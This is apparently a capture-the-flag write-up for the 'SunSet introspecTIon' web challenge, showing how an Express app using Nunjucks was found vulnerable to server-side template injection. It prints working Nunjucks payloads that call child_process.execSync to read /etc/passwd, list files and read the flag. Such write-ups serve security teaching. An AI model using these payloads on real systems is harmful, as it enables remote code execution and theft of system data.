In this challenge, no files were provided, only an URL to access. Accessing
it:

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/home_page.png?raw=true)

a simple HTML page is served with an input box. Interacting with it, we are
sent to another page

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/display_username.png?raw=true)

that is just displaying the content that comes in the *payload* query
parameter.  Looking at the response headers:

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/app_headers.png?raw=true)

there is an *X-Powered-By: Express* header. If we search for that in Google,
we will find out that is related to NodeJS [Express](https://expressjs.com/)
framework.  
To solve the challenge, the title is the clue "SunSet introspecTIon". If we
remove the lower case letters, we will get *SSTI* that translates to [Server
Side Template Injection](https://portswigger.net/research/server-side-
template-injection). The other clue was the
[nunjucks](https://mozilla.github.io/nunjucks/) in the description, which is a
template engine for Js.

To be sure that the challenge is indeed related to an SSTI vulnerability, we
can test it out with `{{7*7}}` that after render should result in 49 being
served.

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/ssti_test.png?raw=true)

and it is indeed that. Now we need to find a way to execute commands there,
and we can use a great resource for that, Hacktricks.
<https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-
injection#nunjucks>

```js  
{{range.constructor("return
global.process.mainModule.require('child_process').execSync('cat
/etc/passwd')")()}}  
```

will result in

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/ssti_passwd.png?raw=true)

Now, we just need to find the flag

```js  
// List the current directory  
{{range.constructor("return
global.process.mainModule.require('child_process').execSync('ls -la')")()}}  
// Get the flag contents  
{{range.constructor("return
global.process.mainModule.require('child_process').execSync('cat flag')")()}}  
```

![Alt text](https://github.com/uac-ctf/UA-CSW-
CTF2022-Writeups/blob/master/web/sunset_intr/images/ssti_flag.png?raw=true)